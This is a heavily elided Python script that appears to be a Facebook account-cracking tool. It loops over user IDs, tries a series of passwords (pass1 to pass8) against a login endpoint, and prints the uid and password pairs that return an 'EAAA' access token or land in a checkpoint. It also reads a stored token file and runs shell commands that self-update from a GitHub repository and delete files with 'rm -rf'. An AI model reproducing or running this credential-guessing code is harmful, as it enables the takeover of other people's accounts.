...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("https://github.com/AFRIDI480/IRFAN_AFRIDI480.git")

			os.system("rm -rf AFRIDI480.py")

			os.system("cp -f afridi/IRFAN-AFRIDI.py \\.")

			os.system("rm -rf afridi")
...
def token():
    ...
    try:
        ...
        token = open("afridi_token.txt", "r").read()
...
def token_check():
	...
	try:
		...
		os.system('rm -rf afridi_token.txt')
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				print(" \033[1;32m[IRFAN-AFRIDI-CP] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					print(" \033[1;33m[IRFAN-AFRIDI-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						print(" \033[1;32m[IRFAN-AFRIDI-CP] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							print(" \033[1;33m[RANJHA-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								print(" \033[1;32m[IRFAN-AFRIDI-CP] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									print(" \033[1;33m[IRFAN-AFRIDI-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										print(" \033[1;32m[IRFAN-AFRIDI-CP] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[IRFAN-AFRIDI-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												print(" \033[1;32m[IRFAN-AFRIDI-CP] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													print(" \033[1;33m[IRFAN-AFRIDI-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[IRFAN-AFRIDI-CP] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[IRFAN-AFRIDI-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[IRFAN-AFRIDI-CP] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[IRFAN-AFRIDI-CP] "+uid+" | "+pass8+"\033[0;97m")
